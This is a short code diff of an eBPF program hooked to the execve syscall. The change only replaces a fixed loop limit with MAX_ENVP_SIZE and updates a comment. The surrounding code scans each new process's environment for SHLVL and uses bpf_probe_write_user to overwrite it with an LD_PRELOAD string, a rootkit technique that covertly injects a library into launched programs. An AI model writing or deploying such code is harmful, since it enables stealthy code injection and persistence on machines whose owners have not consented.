@@ -342,7 +342,7 @@ int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter *ctx
     static const char target[] = "SHLVL";
     const char tmp[100] = { 0 };
 
-    for (u32 i = 0; i < 24; i++) {
+    for (u32 i = 0; i < MAX_ENVP_SIZE; i++) {
         bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr + i);
         bpf_probe_read_user_str(&tmp, sizeof(tmp), envp_ptr);
         // bpf_printk("ENVP: %s", &tmp);
@@ -355,7 +355,7 @@ int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter *ctx
     return 0;
 
 out:
-    /* only hit this if env_ptr is LANG */
+    /* only hit this if env_ptr is target */
     // bpf_printk("SHLVL: %s", &tmp);
     bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));
     return 0;
